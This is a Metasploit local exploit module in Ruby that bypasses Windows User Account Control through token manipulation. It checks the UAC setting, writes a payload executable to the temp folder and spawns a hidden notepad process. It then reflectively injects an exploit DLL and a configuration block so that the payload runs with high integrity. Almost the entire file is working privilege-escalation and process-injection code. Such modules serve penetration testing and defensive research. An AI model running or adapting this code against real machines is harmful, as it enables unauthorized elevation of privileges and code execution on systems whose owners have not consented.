
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'
require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Post::Windows::Priv
  include Post::Windows::Runas
  include Msf::Post::Windows::ReflectiveDLLInjection

  MAX_PATH = 260

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate UAC Protection Bypass (Via Token Magic)',
      'Description'   => %q{
        This module will bypass Windows UAC by performing a number of token operations.
        First, an elevated process' token is duplicated. The its mandatory integrity level
        is lowered and used to create a new restricted token. This is then impersonated
        and the Secondary Logon service is used to spawn a new process with High IL.

        In b33f's words: it's like playing hide-and-go-seek with tokens.

        This technique will bypass the AlwaysNotify setting provided a PID for an elevated
        process is supplied.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'James Foreshaw',    # UAC bypass discovery and research
          'b33f',              # Powershell implementation of James' work
          'OJ Reeves'          # MSF module
        ],
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [
          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html'],
          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html'],
          ['URL', 'https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html'],
          ['URL', 'https://github.com/FuzzySecurity/Powershell-Suite/blob/master/UAC-TokenMagic.ps1'],
        ]
      ],
      'DisclosureDate'=> 'May 25 2017'  # From James' first blog post.
    ))

    register_options([
        OptInt.new('ELEVATEDPID', [true, 'PID of a process that is elevated', 0]),
        OptString.new('FILENAME', [false, 'File name to use when uploading the payload (default is random)']),
        OptString.new('PATH', [false, 'Path to upload folder (default is %TEMP%)'])
      ])
  end

  def check
    if sysinfo['OS'] =~ /Windows (7|8|2008|2012|10|2016)/ && is_uac_enabled?
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    if session.platform != 'windows'
      fail_with(Failure::BadConfig, 'Windows native Meterpreter required')
    end

    if sysinfo['Architecture'] == ARCH_X86 && target_arch.first == ARCH_X64
      fail_with(Failure::BadConfig, 'x64 Target Selected for x86 System')
    end

    # Validate that we can actually do things before we bother
    # doing any more work
    check_permissions!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        if datastore['ELEVATEDPID']
          print_good('UAC is set to "Always Notify", ELEVATEDPID is set, so continuing...')
        else
          fail_with(Failure::NotVulnerable, 'UAC is set to "Always Notify". ELEVATEDPID is required.')
        end
      when UAC_DEFAULT
        print_good('UAC is set to Default')
        print_good('BypassUAC can bypass this setting, continuing...')
      when UAC_NO_PROMPT
        print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
        shell_execute_exe
        return
    end

    # TODO make sure the process exists? Perhaps even make the exploit search for a
    # a process like James' exploit does.
    #if datastore['ELEVATEDPID'].to_i > 0
    #  begin
    #    elev_proc = client.sys.process.open(datastore['ELEVATEDPID'].to_i, PROCESS_QUERY_LIMITED_INFORMATION)
    #  rescue Rex::Post::Meterpreter::RequestError
    #    fail_with(Failure::BadConfig, "Unable to access process #{datastore['ELEVATEDPID']}")
    #  end
    #end

    exe_payload = generate_payload_exe
    payload_filename = datastore['FILENAME'] || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = datastore['PATH'] || get_env('TEMP')
    cmd_location = "#{payload_path}\\#{payload_filename}"
    print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
    write_file(cmd_location, exe_payload)

    print_status('Launching notepad to host the exploiggt...')
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
    rescue Rex::Post::Meterpreter::RequestError
      # Reader Sandbox won't allow to create a new process:
      # stdapi_sys_process_execute: Operation failed: Access is denied.
      print_status('Operation failed. Trying to elevate the current process...')
      process = client.sys.process.open
    end

    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")

    library_path = ::File.join(Msf::Config.data_directory, 'bypassuac_tokenmagic',
                               "bypassuac_tokenmagic.#{session.arch}.dll")
    library_path = ::File.expand_path(library_path)

    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)

    print_status("Exploit injected. Injecting configuration into #{process.pid}...")
    rnd_text = Rex::Text.rand_text_alpha(rand(8) + 6)
    config = [datastore['ELEVATEDPID'].to_i, to_wchar_t(rnd_text, 16), to_wchar_t(cmd_location, MAX_PATH)].pack('Va*a*')
    config_mem = inject_into_process(process, config)

    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status('Configuration injected. Executing exploit...')
    process.thread.create(exploit_mem + offset, config_mem)

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end

  def check_permissions!
    fail_with(Failure::None, 'Already in elevated state') if is_admin? || is_system?

    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    unless check == Exploit::CheckCode::Appears
      fail_with(Failure::NotVulnerable, "Target is not vulnerable.")
    end

    unless is_in_admin_group?
      fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
    end

    print_status('UAC is Enabled, checking level...')
    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end

  def to_wchar_t(item, size)
    to_ascii(item, size).unpack('C*').pack('v*')
  end

  def to_ascii(item, size)
    item.to_s.ljust(size, "\x00")
  end
end
